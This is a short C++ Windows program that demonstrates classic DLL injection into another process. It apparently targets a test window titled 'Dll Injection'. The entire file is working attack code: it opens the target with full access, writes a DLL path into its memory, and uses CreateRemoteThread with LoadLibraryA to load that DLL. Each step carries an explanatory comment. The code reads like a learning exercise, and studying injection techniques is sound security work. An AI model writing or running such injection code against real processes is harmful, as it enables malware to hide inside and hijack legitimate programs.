#include<iostream>
#include<windows.h>

using namespace std;

int main()
{
	printf_s("[*] CLassic dll injection\n");
	LPCSTR PathofDll = "C:/Users/ExD/source/repos/DllMain/Debug/DllMain.dll"; //Path to Dll to be injected 
	HWND hwnd = FindWindowA(NULL, "Dll Injection");
	DWORD process_ID; // DWORD used to store hex value of process ID
	printf_s("[*] Getting Process ID\n");
	GetWindowThreadProcessId(hwnd, &process_ID); // it retrives identifier of process or thread
	printf_s("[*] Opening Process \n");
	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_ID); // Opens a process with provided process ID
	printf_s("[*] Allocating Memory for the Dll Path \n");
	LPVOID ptr_PathofDll = VirtualAllocEx(handle, 0, strlen(PathofDll) + 1, MEM_COMMIT, PAGE_READWRITE); //Allocate memory for the Dll path in the target process
	printf_s("[*] Writing Dll Path in Allocated Memory \n");
	WriteProcessMemory(handle, ptr_PathofDll, (LPVOID)PathofDll, strlen(PathofDll) + 1, 0); // Writes path to allocated memory for Dll in target process
	//creates remote thread in the target process which calls LoadLibrary with argument as DllPath and hence program loads the Dll to be injected
	printf_s("[*] Creating remote thread in target process for loading Dll \n");
	HANDLE handle_thread = CreateRemoteThread(handle, 0, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), ptr_PathofDll, 0, 0);
	printf_s("[*] Waiting for execution of created thread \n");
	WaitForSingleObject(handle_thread, INFINITE); // it waits for execution of thread created 
	cout << "[*] Dll Path allocated at 0x" << hex << ptr_PathofDll << endl;
	cin.get();
	printf_s("[*] Freeing Allocated Memory \n");
	VirtualFreeEx(handle, ptr_PathofDll, strlen(PathofDll) + 1, MEM_RELEASE);
	return 0;
}
